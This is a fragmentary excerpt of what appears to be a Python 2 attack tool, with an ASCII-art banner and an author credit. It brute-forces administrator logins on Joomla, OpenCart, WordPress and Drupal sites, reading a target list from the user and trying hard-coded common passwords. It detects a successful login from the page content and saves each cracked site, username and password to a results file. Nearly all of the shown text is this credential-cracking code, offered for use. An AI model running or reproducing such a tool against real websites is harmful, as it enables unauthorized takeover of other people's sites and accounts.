...
| $$\  $ | $$| $$             /$$  \ $$| $$  | $$        \  $$$/  | $$| $$  | $$
| $$ \/  | $$| $$            |  $$$$$$/| $$  | $$         \  $/   | $$| $$$$$$$/
|__/     |__/|__/             \______/ |__/  |__/          \_/    |__/| $$____/ 
                                                                      | $$      
                                                                      | $$      
                                                                      |__/ 
    ...
    """
            ...
            list = raw_input(' ==> Enter Your Fucking List : ')
                ...
                for pwdjox in passwords:
                    ...
                    if 'New Article' in req_jo.content:
                        ...
                        if 'New Article' in jo_check.content:
                            ...
                            print la5dhar + '[+] cracked successfully Joomla => ' + url + '|' + admin + '|' + pwdjoxz + labyadh + '\n'
                            print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n'
                            open('Result/Result.txt', 'a').write(
    ...
    def opencart(self,url):
        try:
            ...
            passlist = ["123", "demo", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test",
            ...
            print 'Contact Mr~Sn_Vip'

    #add timeout , OK ,
    def wpbrute(self,url):
        try:
            user = "'admin', 'demo', 'wordcamp' "
            passlist = ["123", "z43218765z", "admin", "123456", "pass", "password", "admin123", "12345",
                        "admin@123", "123", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
            ...
            for password in passlist:
                ...
                try:
                    ...
                    if '<li id="wp-admin-bar-logout">' in final:
                        ...
                        print la5dhar + "[+] cracked successfully Wordpress=> " + str(
        ...
        for password in passlist:
            ...
            try:
                ...
                if '"user/logout"' in req.content:
                    open('Result/Result.txt', 'a').write(url + '/?q=user' + '|' + Users + '|' + passwd + '\n')
                    print lasfar + '-----------------------------------------Drupal-----------------------------------------' + labyadh + '\n'
                    print la5dhar + "[+] cracked successfully Drupal => " + url + '/admin|' + user + '|' + password + labyadh + '\n'
                    print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'
